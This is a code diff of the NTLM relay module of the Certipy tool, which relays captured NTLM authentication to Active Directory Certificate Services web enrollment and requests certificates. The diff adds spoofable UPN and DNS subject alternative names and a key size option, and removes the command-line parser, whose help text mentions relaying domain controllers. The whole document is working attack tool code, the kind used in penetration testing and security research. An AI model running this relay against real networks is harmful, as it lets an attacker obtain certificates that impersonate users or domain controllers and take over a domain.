@@ -1,6 +1,5 @@
 import argparse
 import base64
-import logging
 import os
 import re
 import time
@@ -8,7 +7,6 @@ import traceback
 import urllib.parse
 from struct import unpack
 from threading import Lock
-from typing import Callable, Tuple
 
 from impacket.examples.ntlmrelayx.attacks import ProtocolAttack
 from impacket.examples.ntlmrelayx.clients.httprelayclient import HTTPRelayClient
@@ -19,12 +17,13 @@ from impacket.nt_errors import STATUS_ACCESS_DENIED, STATUS_SUCCESS
 from impacket.ntlm import NTLMAuthChallengeResponse
 from impacket.spnego import SPNEGO_NegTokenResp
 
-from certipy.auth import cert_id_to_parts
-from certipy.certificate import (
+from certipy.lib.certificate import (
+    cert_id_to_parts,
     cert_to_pem,
+    create_csr,
     create_pfx,
     csr_to_pem,
-    get_id_from_certificate,
+    get_identifications_from_certificate,
     get_object_sid_from_certificate,
     key_to_pem,
     pem_to_cert,
@@ -32,15 +31,14 @@ from certipy.certificate import (
     rsa,
     x509,
 )
-from certipy.errors import translate_error_code
-from certipy.request import create_csr
+from certipy.lib.errors import translate_error_code
+from certipy.lib.formatting import print_certificate_identifications
+from certipy.lib.logger import logging
 
 try:
     from http.client import HTTPConnection
 except ImportError:
     from httplib import HTTPConnection
-
-NAME = "relay"
 
 
 class ADCSRelayServer(HTTPRelayClient):
@@ -189,15 +187,25 @@ class ADCSAttackClient(ProtocolAttack):
         if template is None:
             template = "Machine" if self.username.endswith("$") else "User"
 
-        alt_name = self.adcs_relay.alt_name
-        csr, key = create_csr(self.username, alt_name=alt_name)
+        csr, key = create_csr(
+            self.username,
+            alt_dns=self.adcs_relay.dns,
+            alt_upn=self.adcs_relay.upn,
+            key_size=self.adcs_relay.key_size,
+        )
 
         csr = csr_to_pem(csr).decode()
 
         attributes = ["CertificateTemplate:%s" % template]
 
-        if alt_name is not None:
-            attributes.append("SAN:upn=%s" % alt_name)
+        if self.adcs_relay.upn is not None or self.adcs_relay.dns is not None:
+            san = []
+            if self.adcs_relay.dns:
+                san.append("dns=%s" % self.adcs_relay.dns)
+            if self.adcs_relay.upn:
+                san.append("upn=%s" % self.adcs_relay.upn)
+
+            attributes.append("SAN:%s" % "&".join(san))
 
         attributes = "\n".join(attributes)
 
@@ -293,9 +301,9 @@ class ADCSAttackClient(ProtocolAttack):
         response = self.client.getresponse()
 
         content = response.read()
-        certificate = pem_to_cert(content)
+        cert = pem_to_cert(content)
 
-        return self.save_certificate(certificate, key=key, request_id=request_id)
+        return self.save_certificate(cert, key=key, request_id=request_id)
 
     def finish_run(self):
         self.adcs_relay.attacked_targets.append(self.client.user)
@@ -308,21 +316,19 @@ class ADCSAttackClient(ProtocolAttack):
         key: rsa.RSAPrivateKey = None,
         request_id: int = None,
     ):
-        id_type, identification = get_id_from_certificate(cert)
-        if id_type is not None:
-            logging.info("Got certificate with %s %s" % (id_type, repr(identification)))
-        else:
-            logging.info("Got certificate without identification")
+        identifications = get_identifications_from_certificate(cert)
+
+        print_certificate_identifications(identifications)
 
         object_sid = get_object_sid_from_certificate(cert)
-        if id_type is not None:
+        if object_sid is not None:
             logging.info("Certificate object SID is %s" % repr(object_sid))
         else:
-            logging.info("Certificate has not object SID")
+            logging.info("Certificate has no object SID")
 
         out = self.adcs_relay.out
         if out is None:
-            out, _ = cert_id_to_parts(id_type, identification)
+            out, _ = cert_id_to_parts(identifications)
             if out is None:
                 out = str(request_id)
 
@@ -366,8 +372,10 @@ class Relay:
         self,
         ca,
         template=None,
-        alt=None,
+        upn=None,
+        dns=None,
         retrieve=None,
+        key_size: int = 2048,
         out=None,
         interface="0.0.0.0",
         port=445,
@@ -379,8 +387,10 @@ class Relay:
     ):
         self.ca = ca
         self.template = template
-        self.alt_name = alt
+        self.upn = upn
+        self.dns = dns
         self.request_id = int(retrieve)
+        self.key_size = key_size
         self.out = out
         self.forever = forever
         self.no_skip = no_skip
@@ -449,77 +459,3 @@ class Relay:
 def entry(options: argparse.Namespace) -> None:
     relay = Relay(**vars(options))
     relay.start()
-
-
-def add_subparser(subparsers: argparse._SubParsersAction) -> Tuple[str, Callable]:
-    subparser = subparsers.add_parser(NAME, help="NTLM Relay to AD CS HTTP Endpoints")
-
-    subparser.add_argument(
-        "-ca",
-        action="store",
-        metavar="hostname",
-        required=True,
-        help="IP address or hostname of certificate authority",
-    )
-    subparser.add_argument("-debug", action="store_true", help="Turn debug output on")
-
-    group = subparser.add_argument_group("certificate request options")
-    group.add_argument(
-        "-template",
-        action="store",
-        metavar="template name",
-        help="If omitted, the template 'Machine' or 'User' is chosen by default depending on whether the relayed account name ends with '$'. Relaying a DC should require specifying the 'DomainController' template",
-    )
-
-    group.add_argument("-alt", action="store", metavar="alternative UPN")
-    group.add_argument(
-        "-retrieve",
-        action="store",
-        metavar="request ID",
-        help="Retrieve an issued certificate specified by a request ID instead of requesting a new certificate",
-        default=0,
-        type=int,
-    )
-
-    group = subparser.add_argument_group("output options")
-    group.add_argument("-out", action="store", metavar="output file name")
-
-    group = subparser.add_argument_group("server options")
-    group.add_argument(
-        "-interface",
-        action="store",
-        metavar="ip address",
-        help="IP Address of interface to listen on",
-        default="0.0.0.0",
-    )
-    group.add_argument(
-        "-port",
-        action="store",
-        help="Port to listen on",
-        default=445,
-        type=int,
-    )
-
-    group = subparser.add_argument_group("relay options")
-    group.add_argument(
-        "-forever",
-        action="store_true",
-        help="Don't stop the relay server after the first successful relay",
-    )
-    group.add_argument(
-        "-no-skip",
-        action="store_true",
-        help="Don't skip previously attacked users. Use with -forever",
-    )
-
-    group = subparser.add_argument_group("connection options")
-    group.add_argument(
-        "-timeout",
-        action="store",
-        metavar="seconds",
-        help="Timeout for connections",
-        default=5,
-        type=int,
-    )
-
-    return NAME, entry
